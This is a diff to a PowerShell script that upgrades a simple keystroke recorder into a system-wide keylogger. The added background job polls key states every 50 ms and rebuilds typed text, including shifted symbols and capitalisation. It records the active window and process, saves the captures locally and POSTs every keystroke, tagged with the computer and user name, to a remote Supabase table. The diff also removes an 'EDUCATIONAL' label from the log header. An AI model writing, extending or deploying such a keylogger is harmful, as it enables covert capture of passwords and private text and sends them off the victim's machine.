@@ -149,24 +149,350 @@ function Show-RecordingStatus {
     Write-Host "Activity Monitor: $activityStatus" -ForegroundColor $(if ($activityStatus -eq "ACTIVE") { "Green" } else { "Red" })
 }
 
+# Enhanced keystroke capture with global hook
+function Start-GlobalKeystrokeCapture {
+    param(
+        [string]$LogPath = "$($Global:Config.LogsFolder)\Keystrokes"
+    )
+    
+    Write-Host "[INFO] Starting global keystroke capture..." -ForegroundColor Green
+    
+    $Global:KeystrokeJob = Start-Job -ScriptBlock {
+        param($logPath, $supabaseUrl, $supabaseKey)
+        
+        # Function to send keystroke data to Supabase
+        function Send-KeystrokeToSupabase {
+            param($KeystrokeData)
+            try {
+                $headers = @{
+                    "apikey" = $supabaseKey
+                    "Authorization" = "Bearer $supabaseKey"
+                    "Content-Type" = "application/json"
+                }
+                $url = "$supabaseUrl/rest/v1/key_logs"
+                $jsonData = $KeystrokeData | ConvertTo-Json -Compress
+                $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $jsonData
+                return $true
+            }
+            catch {
+                Write-Output "[SUPABASE ERROR] Failed to send keystroke data: $($_.Exception.Message)"
+                return $false
+            }
+        }
+        
+        # Enhanced keystroke monitoring with real-time processing
+        Write-Output "[GLOBAL KEYLOGGER] Starting global keystroke capture..."
+        Write-Output "[GLOBAL KEYLOGGER] Logs will be saved to: $logPath"
+        
+        # Ensure log directory exists
+        if (-not (Test-Path $logPath)) {
+            New-Item -ItemType Directory -Path $logPath -Force | Out-Null
+        }
+        
+        # Buffer for batch processing
+        $keystrokeBuffer = @()
+        $sessionBuffer = ""
+        $lastSaveTime = Get-Date
+        $deviceId = "$env:COMPUTERNAME-$env:USERNAME"
+        
+        # Alternative method using .NET classes for better compatibility
+        Add-Type -AssemblyName System.Windows.Forms
+        
+        # Simple polling method as fallback
+        $lastClipboard = ""
+        $keystrokeCount = 0
+        
+        Write-Output "[GLOBAL KEYLOGGER] Monitoring started. Press Ctrl+C in main window to stop."
+        
+        while ($true) {
+            try {
+                # Get current active window
+                Add-Type @"
+                    using System;
+                    using System.Runtime.InteropServices;
+                    using System.Text;
+                    public class WindowInfo {
+                        [DllImport("user32.dll")]
+                        public static extern IntPtr GetForegroundWindow();
+                        [DllImport("user32.dll")]
+                        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+                        [DllImport("user32.dll")]
+                        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
+                    }
+"@
+                
+                $hwnd = [WindowInfo]::GetForegroundWindow()
+                $title = New-Object System.Text.StringBuilder(256)
+                [WindowInfo]::GetWindowText($hwnd, $title, 256) | Out-Null
+                
+                $processId = [uint32]0
+                [WindowInfo]::GetWindowThreadProcessId($hwnd, [ref]$processId) | Out-Null
+                
+                $currentWindow = "Unknown"
+                if ($processId -gt 0) {
+                    try {
+                        $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
+                        if ($process) {
+                            $currentWindow = "$($process.ProcessName) - $($title.ToString())"
+                        }
+                    } catch { }
+                }
+                
+                # Enhanced keystroke detection using clipboard monitoring and key state checking
+                $keyStates = @{}
+                
+                # Check common keys (expanded set)
+                $keysToCheck = @{
+                    # Letters
+                    65 = "A"; 66 = "B"; 67 = "C"; 68 = "D"; 69 = "E"; 70 = "F"; 71 = "G"; 72 = "H"; 73 = "I"; 74 = "J";
+                    75 = "K"; 76 = "L"; 77 = "M"; 78 = "N"; 79 = "O"; 80 = "P"; 81 = "Q"; 82 = "R"; 83 = "S"; 84 = "T";
+                    85 = "U"; 86 = "V"; 87 = "W"; 88 = "X"; 89 = "Y"; 90 = "Z";
+                    # Numbers
+                    48 = "0"; 49 = "1"; 50 = "2"; 51 = "3"; 52 = "4"; 53 = "5"; 54 = "6"; 55 = "7"; 56 = "8"; 57 = "9";
+                    # Common keys
+                    32 = "SPACE"; 13 = "ENTER"; 8 = "BACKSPACE"; 9 = "TAB"; 27 = "ESC";
+                    # Punctuation
+                    186 = ";"; 187 = "="; 188 = ","; 189 = "-"; 190 = "."; 191 = "/";
+                    219 = "["; 220 = "BACKSLASH"; 221 = "]"; 222 = "QUOTE";
+                    # Function keys
+                    112 = "F1"; 113 = "F2"; 114 = "F3"; 115 = "F4"; 116 = "F5"; 117 = "F6";
+                    118 = "F7"; 119 = "F8"; 120 = "F9"; 121 = "F10"; 122 = "F11"; 123 = "F12";
+                    # Arrow keys
+                    37 = "LEFT"; 38 = "UP"; 39 = "RIGHT"; 40 = "DOWN";
+                    # Navigation keys
+                    45 = "INSERT"; 46 = "DELETE"; 36 = "HOME"; 35 = "END"; 33 = "PGUP"; 34 = "PGDN"
+                }
+                
+                Add-Type @"
+                    using System;
+                    using System.Runtime.InteropServices;
+                    public class KeyState {
+                        [DllImport("user32.dll")]
+                        public static extern short GetAsyncKeyState(int vKey);
+                    }
+"@
+                
+                # Check for key presses
+                foreach ($keyCode in $keysToCheck.Keys) {
+                    $keyState = [KeyState]::GetAsyncKeyState($keyCode)
+                    if ($keyState -band 0x8000) {  # Key is currently pressed
+                        if (-not $keyStates.ContainsKey($keyCode) -or -not $keyStates[$keyCode]) {
+                            $keyName = $keysToCheck[$keyCode]
+                            $timestamp = Get-Date
+                            
+                            # Check modifier keys
+                            $shiftPressed = [KeyState]::GetAsyncKeyState(16) -band 0x8000  # VK_SHIFT
+                            $ctrlPressed = [KeyState]::GetAsyncKeyState(17) -band 0x8000   # VK_CONTROL
+                            $altPressed = [KeyState]::GetAsyncKeyState(18) -band 0x8000    # VK_MENU (Alt)
+                            $capsLockOn = [KeyState]::GetAsyncKeyState(20) -band 0x0001    # VK_CAPITAL (Caps Lock toggle state)
+                            
+                            # Add to session buffer with proper case handling
+                            if ($keyName -eq "SPACE") {
+                                $sessionBuffer += " "
+                            } 
+                            elseif ($keyName -eq "ENTER") {
+                                $sessionBuffer += "`n"  # Use actual newline instead of [ENTER]
+                            } 
+                            elseif ($keyName -eq "BACKSPACE") {
+                                # Actually remove last character if possible
+                                if ($sessionBuffer.Length -gt 0) {
+                                    $sessionBuffer = $sessionBuffer.Substring(0, $sessionBuffer.Length - 1)
+                                }
+                            } 
+                            elseif ($keyName -eq "TAB") {
+                                $sessionBuffer += "`t"  # Use actual tab
+                            } 
+                            elseif ($keyName -match "^[A-Z]$") {
+                                # Letter keys - handle case properly
+                                $shouldBeUppercase = ($shiftPressed -and -not $capsLockOn) -or (-not $shiftPressed -and $capsLockOn)
+                                if ($shouldBeUppercase) {
+                                    $sessionBuffer += $keyName.ToUpper()
+                                } else {
+                                    $sessionBuffer += $keyName.ToLower()
+                                }
+                            }
+                            elseif ($keyName -match "^[0-9]$") {
+                                # Number keys - handle shift symbols
+                                if ($shiftPressed) {
+                                    $shiftSymbols = @{
+                                        "1" = "!"; "2" = "@"; "3" = "#"; "4" = "$"; "5" = "%"
+                                        "6" = "^"; "7" = "&"; "8" = "*"; "9" = "("; "0" = ")"
+                                    }
+                                    if ($shiftSymbols.ContainsKey($keyName)) {
+                                        $sessionBuffer += $shiftSymbols[$keyName]
+                                    } else {
+                                        $sessionBuffer += $keyName
+                                    }
+                                } else {
+                                    $sessionBuffer += $keyName
+                                }
+                            }
+                            elseif ($keyName -eq ";") {
+                                $sessionBuffer += if ($shiftPressed) { ":" } else { ";" }
+                            }
+                            elseif ($keyName -eq "=") {
+                                $sessionBuffer += if ($shiftPressed) { "+" } else { "=" }
+                            }
+                            elseif ($keyName -eq ",") {
+                                $sessionBuffer += if ($shiftPressed) { "<" } else { "," }
+                            }
+                            elseif ($keyName -eq "-") {
+                                $sessionBuffer += if ($shiftPressed) { "_" } else { "-" }
+                            }
+                            elseif ($keyName -eq ".") {
+                                $sessionBuffer += if ($shiftPressed) { ">" } else { "." }
+                            }
+                            elseif ($keyName -eq "/") {
+                                $sessionBuffer += if ($shiftPressed) { "?" } else { "/" }
+                            }
+                            elseif ($keyName -eq "[") {
+                                $sessionBuffer += if ($shiftPressed) { "{" } else { "[" }
+                            }
+                            elseif ($keyName -eq "BACKSLASH") {
+                                $sessionBuffer += if ($shiftPressed) { "|" } else { "\" }
+                            }
+                            elseif ($keyName -eq "]") {
+                                $sessionBuffer += if ($shiftPressed) { "}" } else { "]" }
+                            }
+                            elseif ($keyName -eq "QUOTE") {
+                                $sessionBuffer += if ($shiftPressed) { '"' } else { "'" }
+                            }
+                            elseif ($keyName -in @("F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12")) {
+                                $sessionBuffer += "[$keyName]"
+                            }
+                            elseif ($keyName -in @("LEFT", "UP", "RIGHT", "DOWN", "INSERT", "DELETE", "HOME", "END", "PGUP", "PGDN", "ESC")) {
+                                $sessionBuffer += "[$keyName]"
+                            }
+                            else {
+                                # Fallback for any other keys
+                                $sessionBuffer += $keyName
+                            }
+                            
+                            $keystrokeData = @{
+                                device_id = $deviceId
+                                key_pressed = $keyName
+                                key_code = $keyCode
+                                window_title = $currentWindow
+                                timestamp = $timestamp.ToString("o")
+                            }
+                            
+                            # Log locally
+                            $logEntry = "[$($timestamp.ToString('yyyy-MM-dd HH:mm:ss.fff'))] [$currentWindow] Key: $keyName (Code: $keyCode)"
+                            Write-Output $logEntry
+                            
+                            # Add to buffer
+                            $keystrokeBuffer += $keystrokeData
+                            $keystrokeCount++
+                            
+                            # Save buffer periodically
+                            if ($keystrokeBuffer.Count -ge 10 -or ((Get-Date) - $lastSaveTime).TotalSeconds -ge 30) {
+                                # Save to file
+                                $timestamp_file = Get-Date -Format "yyyyMMdd_HHmmss"
+                                $logFile = "$logPath\global_keystrokes_$timestamp_file.json"
+                                $keystrokeBuffer | ConvertTo-Json | Out-File -FilePath $logFile -Encoding UTF8
+                                
+                                # Save session buffer
+                                $sessionFile = "$logPath\session_buffer_$timestamp_file.txt"
+                                $bufferContent = "=== SESSION BUFFER (Length: $($sessionBuffer.Length)) ===" + "`n" + $sessionBuffer + "`n" + "=== END BUFFER ==="
+                                $bufferContent | Out-File -FilePath $sessionFile -Encoding UTF8
+                                
+                                # Send to Supabase (batch)
+                                foreach ($keystroke in $keystrokeBuffer) {
+                                    Send-KeystrokeToSupabase -KeystrokeData $keystroke | Out-Null
+                                }
+                                
+                                Write-Output "[GLOBAL KEYLOGGER] Saved $($keystrokeBuffer.Count) keystrokes to $logFile"
+                                Write-Output "[SESSION] Buffer saved: $($sessionBuffer.Length) characters"
+                                $keystrokeBuffer = @()
+                                $lastSaveTime = Get-Date
+                            }
+                            
+                            $keyStates[$keyCode] = $true
+                        }
+                    } else {
+                        $keyStates[$keyCode] = $false
+                    }
+                }
+                
+                Start-Sleep -Milliseconds 50  # Check every 50ms for responsive key detection
+                
+            }
+            catch {
+                Write-Output "[GLOBAL KEYLOGGER ERROR] $($_.Exception.Message)"
+                Start-Sleep -Seconds 5
+            }
+        }
+        
+    } -ArgumentList $LogPath, $Global:Config.SupabaseUrl, $Global:Config.SupabaseKey
+    
+    Write-Host "[SUCCESS] Global keystroke capture started in background" -ForegroundColor Green
+    
+    # Monitor job output
+    Start-Job -ScriptBlock {
+        param($job)
+        while ($job.State -eq "Running") {
+            $output = Receive-Job -Job $job
+            if ($output) {
+                Write-Host "[KEYLOGGER] $output" -ForegroundColor Yellow
+            }
+            Start-Sleep -Seconds 1
+        }
+    } -ArgumentList $Global:KeystrokeJob | Out-Null
+}
+
+
+function Stop-GlobalKeystrokeCapture {
+    if ($Global:KeystrokeJob) {
+        # Get the final session buffer before stopping
+        $finalOutput = Receive-Job -Job $Global:KeystrokeJob
+        
+        Stop-Job -Job $Global:KeystrokeJob -ErrorAction SilentlyContinue
+        Remove-Job -Job $Global:KeystrokeJob -ErrorAction SilentlyContinue
+        $Global:KeystrokeJob = $null
+        Write-Host "[INFO] Global keystroke capture stopped" -ForegroundColor Green
+        
+        return $finalOutput
+    }
+}
+
 function Start-KeystrokeRecording {
+    if ($Global:IsRecording) {
+        Write-Host "Keystroke recording is already active." -ForegroundColor Yellow
+        return
+    }
+    
     $Global:IsRecording = $true
     $Global:RecordingStartTime = Get-Date
     $Global:KeystrokeBuffer = ""
+    $Global:SessionString = ""  # Add this for session tracking
     
-    $context = Get-CurrentContext
-    $Global:RecordingWindow = "$($context.ProcessName) - $($context.WindowTitle)"
+    # Get current context safely
+    try {
+        $context = Get-CurrentContext
+        $Global:RecordingWindow = "$($context.ProcessName) - $($context.WindowTitle)"
+    }
+    catch {
+        $Global:RecordingWindow = "Unknown Window"
+    }
     
     Write-Host ""
-    Write-Host "[KEYSTROKE RECORDING STARTED]" -ForegroundColor Red -BackgroundColor Yellow
-    Write-Host "Context: $Global:RecordingWindow" -ForegroundColor Cyan
+    Write-Host "[GLOBAL KEYSTROKE RECORDING STARTED]" -ForegroundColor Red -BackgroundColor Yellow
+    Write-Host "Mode: SESSION STRING CAPTURE" -ForegroundColor Cyan
+    Write-Host "Device: $env:COMPUTERNAME-$env:USERNAME" -ForegroundColor Cyan
     Write-Host ""
-    Write-Host "Instructions:" -ForegroundColor Green
-    Write-Host "- Type your text and press Enter to capture each line" -ForegroundColor White
-    Write-Host "- Type 'STOP' to end keystroke recording" -ForegroundColor White
+    Write-Host "Now capturing ALL keystrokes system-wide into session string!" -ForegroundColor Red
+    Write-Host "Special keys will be formatted as: [ENTER], [BACKSPACE], [TAB], etc." -ForegroundColor White
+    Write-Host ""
+    Write-Host "Commands:" -ForegroundColor Green
+    Write-Host "- Type 'STOP' in this PowerShell window to end recording" -ForegroundColor White
+    Write-Host "- Type 'STATUS' to see current recording status" -ForegroundColor White
     Write-Host "- Type 'QUIT' to exit the program completely" -ForegroundColor White
     Write-Host ""
-    Write-Host "Start typing (press Enter after each line):" -ForegroundColor Cyan
+    
+    # Start global keystroke capture
+    Start-GlobalKeystrokeCapture
+    
+    Write-Host "Global keystroke recording is now ACTIVE!" -ForegroundColor Green
 }
 
 function Stop-KeystrokeRecording {
@@ -179,19 +505,62 @@ function Stop-KeystrokeRecording {
     $endTime = Get-Date
     
     Write-Host ""
-    Write-Host "[KEYSTROKE RECORDING STOPPED]" -ForegroundColor Green -BackgroundColor Black
+    Write-Host "[STOPPING GLOBAL KEYSTROKE RECORDING...]" -ForegroundColor Yellow
     
-    if ($Global:KeystrokeBuffer.Length -gt 0) {
-        Write-Host "`nRecorded content ($($Global:KeystrokeBuffer.Length) characters):" -ForegroundColor Cyan
-        Write-Host "========================================" -ForegroundColor Gray
-        Write-Host $Global:KeystrokeBuffer -ForegroundColor White
-        Write-Host "========================================" -ForegroundColor Gray
+    # Stop global capture and get final session data
+    $finalOutput = Stop-GlobalKeystrokeCapture
+    
+    # Try to extract session string from the most recent buffer file
+    $keystrokesFolder = "$($Global:Config.LogsFolder)\Keystrokes"
+    if (Test-Path $keystrokesFolder) {
+        $latestBufferFile = Get-ChildItem -Path $keystrokesFolder -Filter "session_buffer_*.txt" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1
         
-        # Save locally and to Supabase
-        Save-KeystrokesToFile -Keystrokes $Global:KeystrokeBuffer -WindowTitle $Global:RecordingWindow -StartTime $Global:RecordingStartTime -EndTime $endTime
-        Send-KeystrokesToSupabase -Keystrokes $Global:KeystrokeBuffer -WindowTitle $Global:RecordingWindow -StartTime $Global:RecordingStartTime -EndTime $endTime
-    } else {
-        Write-Host "No content was recorded." -ForegroundColor Yellow
+        $sessionString = ""
+        if ($latestBufferFile) {
+            try {
+                $bufferContent = Get-Content -Path $latestBufferFile.FullName -Raw -ErrorAction SilentlyContinue
+                # Extract content between markers
+                if ($bufferContent -match "=== SESSION BUFFER.*?===\s*\n(.*?)\n=== END BUFFER ===") {
+                    $sessionString = $matches[1]
+                }
+                elseif ($bufferContent -match "=== SESSION BUFFER.*?===\s*\r?\n(.*?)\r?\n=== END BUFFER ===") {
+                    $sessionString = $matches[1]
+                }
+            }
+            catch {
+                Write-Host "[WARNING] Could not read session buffer: $($_.Exception.Message)" -ForegroundColor Yellow
+            }
+        }
+    }
+    else {
+        $sessionString = ""
+        Write-Host "[WARNING] Keystrokes folder not found" -ForegroundColor Yellow
+    }
+    
+    Write-Host ""
+    Write-Host "[GLOBAL KEYSTROKE RECORDING STOPPED]" -ForegroundColor Green -BackgroundColor Black
+    
+    $duration = ($endTime - $Global:RecordingStartTime).TotalSeconds
+    Write-Host "Recording duration: $([math]::Round($duration, 1)) seconds" -ForegroundColor Cyan
+    Write-Host "Session string length: $($sessionString.Length) characters" -ForegroundColor Cyan
+    
+    # Save session to file and database
+    if ($sessionString.Length -gt 0) {
+        $saveSuccess = Save-KeystrokesToFile -Keystrokes $sessionString -WindowTitle $Global:RecordingWindow -StartTime $Global:RecordingStartTime -EndTime $endTime
+        
+        if ($saveSuccess) {
+            # Send to database
+            Write-Host "[INFO] Sending session to database..." -ForegroundColor Cyan
+            Send-KeystrokesToSupabase -Keystrokes $sessionString -WindowTitle $Global:RecordingWindow -StartTime $Global:RecordingStartTime -EndTime $endTime
+        }
+        
+        Write-Host ""
+        Write-Host "SESSION PREVIEW (first 200 chars):" -ForegroundColor Green
+        $preview = if ($sessionString.Length -gt 200) { $sessionString.Substring(0, 200) + "..." } else { $sessionString }
+        Write-Host $preview -ForegroundColor White
+    } 
+    else {
+        Write-Host "[WARNING] No session string captured. Check if keylogger was working properly." -ForegroundColor Yellow
     }
 }
 
@@ -222,14 +591,18 @@ function Save-KeystrokesToFile {
         
         # Save to organized folder structure
         $keystrokesFolder = "$($Global:Config.LogsFolder)\Keystrokes"
-        $logFileName = "$keystrokesFolder\keystroke_log_$timestamp.json"
+        if (-not (Test-Path $keystrokesFolder)) {
+            New-Item -ItemType Directory -Path $keystrokesFolder -Force | Out-Null
+        }
+        
+        $logFileName = "$keystrokesFolder\keystroke_session_$timestamp.json"
         $keystrokeLog | ConvertTo-Json -Depth 3 | Out-File -FilePath $logFileName -Encoding UTF8
         Write-Host "[SUCCESS] Keystroke session saved to: $logFileName" -ForegroundColor Green
         
         # Save readable text version
-        $textFileName = "$keystrokesFolder\keystroke_log_$timestamp.txt"
+        $textFileName = "$keystrokesFolder\keystroke_session_$timestamp.txt"
         $textContent = @"
-=== EDUCATIONAL KEYSTROKE LOG ===
+=== KEYSTROKE SESSION LOG ===
 Device: $deviceId
 Context: $WindowTitle
 Start Time: $($StartTime.ToString("yyyy-MM-dd HH:mm:ss"))
@@ -238,12 +611,12 @@ Duration: $([math]::Round(($EndTime - $StartTime).TotalSeconds, 1)) seconds
 Character Count: $($Keystrokes.Length)
 Line Count: $(($Keystrokes -split "`n").Count)
 
-=== CAPTURED CONTENT ===
+=== SESSION STRING ===
 $Keystrokes
-=== END OF LOG ===
+=== END OF SESSION ===
 "@
         $textContent | Out-File -FilePath $textFileName -Encoding UTF8
-        Write-Host "[SUCCESS] Readable keystroke log saved to: $textFileName" -ForegroundColor Green
+        Write-Host "[SUCCESS] Readable session log saved to: $textFileName" -ForegroundColor Green
         
         return $true
     }
@@ -261,14 +634,31 @@ function Send-KeystrokesToSupabase {
         [datetime]$EndTime
     )
     
-    $keystrokeData = @{
-        device_id = "$env:COMPUTERNAME-$env:USERNAME"
-        keystrokes = $Keystrokes
-        window_title = $WindowTitle
-        timestamp = $StartTime.ToString("o")
+    try {
+        $keystrokeData = @{
+            device_id = "$env:COMPUTERNAME-$env:USERNAME"
+            keystrokes = $Keystrokes
+            window_title = $WindowTitle
+            timestamp = $StartTime.ToString("o")
+        }
+        
+        $result = Send-ToSupabase -Table "key_logs" -Data $keystrokeData
+        
+        if ($result) {
+            Write-Host "[SUCCESS] Session string sent to database successfully!" -ForegroundColor Green
+            Write-Host "- Session length: $($Keystrokes.Length) characters" -ForegroundColor Cyan
+            Write-Host "- Window context: $WindowTitle" -ForegroundColor Cyan
+        } 
+        else {
+            Write-Host "[ERROR] Failed to send session to database" -ForegroundColor Red
+        }
+        
+        return $result
     }
-    
-    Send-ToSupabase -Table "key_logs" -Data $keystrokeData
+    catch {
+        Write-Host "[ERROR] Database error: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
 }
 
 # Enhanced Activity Monitor
